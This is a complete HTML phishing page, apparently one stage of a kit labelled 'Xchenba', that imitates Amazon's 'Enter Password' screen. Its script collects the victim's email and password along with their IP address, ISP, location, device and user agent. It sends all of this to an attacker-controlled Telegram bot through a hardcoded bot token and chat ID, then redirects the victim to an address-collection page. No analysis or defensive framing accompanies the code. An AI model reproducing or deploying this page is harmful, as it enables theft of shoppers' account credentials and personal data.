<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Enter Password</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 10px 0 25px; text-align: center; }
        .logo span { font-size: 28px; font-weight: 700; color: #111; }
        .kotak { width: 100%; max-width: 340px; border: 1px solid #ddd; border-radius: 4px; padding: 20px 26px; }
        h1 { font-size: 28px; font-weight: 500; margin-bottom: 6px; }
        .email-tampil { font-size: 14px; color: #555; margin-bottom: 20px; }
        label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 5px; margin-top: 18px; }
        .baris { display: flex; justify-content: space-between; align-items: center; margin-top: 5px; }
        .baris a { font-size: 13px; color: #0066c0; text-decoration: none; }
        input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 14px; height: 36px; }
        input:focus { outline: none; border-color: #007185; box-shadow: 0 0 0 1px #007185; }
        .tombol { width: 100%; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; padding: 8px 10px; font-size: 14px; color: #0F1111; cursor: pointer; margin-top: 22px; font-weight: 500; }
        .tombol:hover { background: #f7ca00; }
        .garis { height: 1px; background: #e7e7e7; margin: 30px 0 20px; }
        .bawah { font-size: 12px; color: #555; text-align: center; margin-top: 30px; }
        .bawah a { color: #0066c0; text-decoration: none; margin: 0 6px; }
    </style>
</head>
<body>
    <div class="logo"><span>amazon</span></div>
    <div class="kotak">
        <h1 id="judul">Sign In</h1>
        <p class="email-tampil" id="emailTampil">-</p>
        <label id="lblSandi">Password</label>
        <input type="password" id="sandi" autocomplete="current-password">
        <div class="baris"><a href="#" id="lupaSandi">Forgot your password?</a></div>
        <button type="button" id="masuk" class="tombol">Sign In</button>
    </div>
    <div class="garis"></div>
    <div class="bawah">
        <a href="#">Conditions of Use</a> | <a href="#">Privacy Notice</a> | <a href="#">Help</a>
        <p style="margin-top:5px;">&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
const CHAT_ID = '7808815199';
const EMAIL_PENERIMA = 'jandaanaksatu777@gmail.com';

const terjemahan = {
  en: { judul:'Sign In', lblSandi:'Password', lupaSandi:'Forgot your password?', btn:'Sign In' },
  id: { judul:'Masuk', lblSandi:'Kata Sandi', lupaSandi:'Lupa kata sandi?', btn:'Masuk' },
  ja: { judul:'ログイン', lblSandi:'パスワード', lupaSandi:'パスワードを忘れた場合', btn:'ログイン' },
  zh: { judul:'登录', lblSandi:'密码', lupaSandi:'忘记密码？', btn:'登录' },
  th: { judul:'เข้าสู่ระบบ', lblSandi:'รหัสผ่าน', lupaSandi:'ลืมรหัสผ่าน?', btn:'เข้าสู่ระบบ' }
};

async function deteksiBahasa() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const d = await res.json();
    const c = d.country_code || 'ID';
    if (['JP'].includes(c)) return 'ja';
    if (['CN'].includes(c)) return 'zh';
    if (['TH'].includes(c)) return 'th';
    if (['ID'].includes(c)) return 'id';
  } catch {}
  return navigator.language.startsWith('ja') ? 'ja' :
         navigator.language.startsWith('zh') ? 'zh' :
         navigator.language.startsWith('th') ? 'th' :
         navigator.language.startsWith('id') ? 'id' : 'en';
}

async function ambilInfoPengunjung() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const d = await res.json();
    return { ip: d.ip || '-', isp: d.org || '-', negara: d.country_name || '-', kota: d.city || '-' };
  } catch { return { ip: '-', isp: '-', negara: '-', kota: '-' }; }
}

function ambilUA() {
  const ua = navigator.userAgent;
  let perangkat = 'Desktop';
  if (/Android|iPhone|iPad|Mobile/.test(ua)) perangkat = 'Mobile';
  let browser = 'Unknown';
  if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
  else if (/Firefox/.test(ua)) browser = 'Firefox';
  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
  else if (/Edg/.test(ua)) browser = 'Edge';
  return { perangkat, browser, ua };
}

async function kirimTelegram(pesan) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'Markdown' })
    });
  } catch {}
}

document.addEventListener('DOMContentLoaded', async () => {
  const email = localStorage.getItem('email_pengguna');
  if (!email) { window.location.href = 'amazon.html'; return; }
  document.getElementById('emailTampil').textContent = email;
  
  const b = await deteksiBahasa();
  const t = terjemahan[b] || terjemahan.en;
  document.getElementById('judul').textContent = t.judul;
  document.getElementById('lblSandi').textContent = t.lblSandi;
  document.getElementById('lupaSandi').textContent = t.lupaSandi;
  document.getElementById('masuk').textContent = t.btn;
});

document.getElementById('masuk').addEventListener('click', async () => {
  const email = localStorage.getItem('email_pengguna');
  const sandi = document.getElementById('sandi').value.trim();
  if (!sandi) return;
  
  localStorage.setItem('kata_sandi', sandi);
  const info = await ambilInfoPengunjung();
  const ua = ambilUA();

  const teks = `
:: Xchenba ::
:: LOGIN INFO ::
# Email         : ${email}
# Password      : ${sandi}
:: Visitor Details ::
# Device        : ${ua.perangkat}
# Browser       : ${ua.browser}
# Country       : ${info.negara}
# City          : ${info.kota}
# ISP           : ${info.isp}
# IP Address    : ${info.ip}
# User Agent    : ${ua.ua}
  `.trim();

  await kirimTelegram(teks);
  window.location.href = 'address.html';
});
</script>
</body>
</html>
